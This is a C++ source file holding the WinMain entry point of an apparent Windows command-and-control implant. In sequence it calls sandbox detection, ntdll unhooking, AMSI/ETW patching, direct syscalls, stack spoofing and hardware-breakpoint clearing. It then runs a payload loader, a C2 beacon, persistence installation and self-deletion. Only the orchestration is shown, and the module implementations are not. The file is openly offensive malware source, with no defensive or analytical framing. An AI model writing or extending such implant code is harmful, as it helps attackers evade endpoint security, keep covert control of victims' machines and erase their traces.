// /SUBSYSTEM:WINDOWS — network-first boot.
#include <windows.h>

#include "audit/Imports.h"
#include "core/Beacon.h"
#include "core/Config.h"
#include "core/StageLog.h"
#include "evasive/AmsiEtw.h"
#include "evasive/HwbpClean.h"
#include "evasive/Loader.h"
#include "evasive/MemGuard.h"
#include "evasive/Sandbox.h"
#include "evasive/StackSpoof.h"
#include "evasive/Syscalls.h"
#include "evasive/Unhook.h"
#include "evasive/Strings.h"
#include "persist/Install.h"
#include "persist/SelfDel.h"

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    C2_STAGE("start");
    audit::mark();

#ifdef C2_SANDBOX_ABORT
    if (sandbox::is_sandbox()) { C2_STAGE("sandbox-abort"); return 0; }
#endif

#ifdef C2_EARLY_EVASION
    C2_STAGE("unhook");
    unhook::unhook_ntdll();
    C2_STAGE("amisetw");
    amisetw::patch();
    C2_STAGE("syscalls");
    syscalls::init();
    C2_STAGE("stackspoof");
    if (stackspoof::init()) stackspoof::hide_thread();
    C2_STAGE("hwbp");
    hwbp::clear_self();
#else
    C2_STAGE("bind-ntdll");
    unhook::bind_ntdll();
    C2_STAGE("syscalls");
    syscalls::init();
    C2_STAGE("hwbp");
    hwbp::clear_self();
#endif

    C2_STAGE("loader");
    loader::run(loader::build_mode());
    C2_STAGE("beacon");
    beacon::run();
    C2_STAGE("beacon-returned");
#ifdef C2_PERSIST_ENABLE
    inst::run();
#endif
#ifdef C2_SELF_DEL_ENABLE
    sd::run();
#endif
    C2_STAGE("exit");
    return 0;
}
